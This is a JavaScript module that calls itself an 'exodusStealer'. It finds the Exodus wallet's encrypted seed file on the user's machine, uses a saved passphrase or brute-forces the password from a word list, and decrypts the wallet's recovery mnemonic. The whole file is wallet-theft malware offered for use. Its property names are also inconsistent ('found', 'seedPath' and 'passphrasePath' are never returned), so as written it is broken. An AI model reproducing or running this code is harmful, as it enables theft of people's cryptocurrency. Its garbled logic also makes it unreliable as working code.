const zlib = require("zlib");
const bs = require("bitcoin-seed");
const fs = require("fs");
const path = require("path");
const os = require("os");
const seco = require("secure-container");

function shrink(secoData) {
    if (!secoData || secoData.length < 4) {
        throw new Error("Invalid SECO data: Buffer too short.");
    }
    const t = secoData.readUInt32BE(0);
    if (secoData.length < t + 4) {
        throw new Error(`Invalid SECO data: Expected length ${t + 4}, got ${secoData.length}.`);
    }
    return secoData.slice(4, t + 4);
}

function decrypt(secoPath, password) {
    const fileBuffer = fs.readFileSync(secoPath);
    const decrypted = seco.decryptData(fileBuffer, password).data;
    const shrinked = shrink(decrypted);
    const gunzipped = zlib.gunzipSync(shrinked);
    return bs.fromBuffer(gunzipped).mnemonicString;
}

function locateExodus() {
    let exodusDir;
    const platform = os.platform();

    try {
        if (platform === "win32") {
            exodusDir = path.join(process.env.APPDATA, "Exodus", "exodus.wallet");
        } else if (platform === "darwin") {
            exodusDir = path.join(os.homedir(), "Library", "Application Support", "Exodus", "exodus.wallet");
        } else if (platform === "linux") {
            exodusDir = path.join(os.homedir(), ".config", "Exodus", "exodus.wallet");
        } else {
            return { exodus: false, error: `Unsupported operating system: ${platform}` };
        }

        const seedPath = path.join(exodusDir, "seed.seco");
        const passphrasePath = path.join(exodusDir, "passphrase.json");

        if (fs.existsSync(seedPath)) {
            return {
                exodus: true,
                path: seedPath,
                walletDir: exodusDir,
                passwordRequired: !fs.existsSync(passphrasePath),
            };
        }
        return { exodus: false, error: `seed.seco not found at: ${seedPath}` };
    } catch (error) {
        return { exodus: false, error: `Filesystem error during Exodus location: ${error.message}` };
    }
}


function bruteForcePassword(seedPath, passwordList) {
    const seedBuffer = fs.readFileSync(seedPath);
    const uniquePasswords = [...new Set(passwordList.filter(p => p.length > 4))];

    const total = uniquePasswords.length;
    const start = process.hrtime();
    let tried = 0;

    for (const password of uniquePasswords) {
        tried++;
        if (tried % 100 === 0 || tried === 1) {
            console.log(`[Progress] Trying password ${tried}/${total} : "${password}"`);
        }

        try {
            seco.decryptData(seedBuffer, password);
            const [sec, nano] = process.hrtime(start);
            console.log(`[Success] Found password after ${tried} attempts!`);
            return {
                success: true,
                password,
                tried,
                time: `${sec} seconds and ${nano / 1e6} milliseconds`
            };
        } catch {
            // Incorrect password — keep trying
        }
    }

    console.log(`[Failure] Tried all ${total} passwords. None worked.`);
    return { success: false, tried, error: "Password not found in list." };
}

function exodusStealer(passwords) {
    const exodusInfo = locateExodus();

    if (!exodusInfo.found) {
        console.log("[Info] Exodus wallet not found.");
        return { found: false };
    }

    console.log(`[Info] Exodus wallet found. Password required: ${exodusInfo.passwordRequired}`);

    if (!exodusInfo.passwordRequired) {
        console.log(`[Info] Using saved passphrase.`);
        const passphrase = JSON.parse(fs.readFileSync(exodusInfo.passphrasePath, "utf8")).passphrase;
        const mnemonic = decrypt(exodusInfo.seedPath, passphrase);
        return { found: true, mnemonic };
    }

    console.log(`[Info] Starting brute force...`);

    const brute = bruteForcePassword(exodusInfo.seedPath, passwords);

    if (brute.success) {
        const mnemonic = decrypt(exodusInfo.seedPath, brute.password);
        return {
            found: true,
            mnemonic,
            password: brute.password,
            time: brute.time,
            tried: brute.tried
        };
    }

    return { found: true, error: brute.error, tried: brute.tried };
}

function readPasswordList(filePath) {
    return fs.readFileSync(filePath, "utf8")
        .split(/\r?\n/)
        .filter(line => line.trim().length > 0);
}

// Example usage:
const passwords = readPasswordList("list.txt");
const result = exodusStealer(passwords);

console.log(result);

module.exports = {
    locateExodus,
    bruteForcePassword,
    exodusStealer,
    readPasswordList,
    decrypt
};



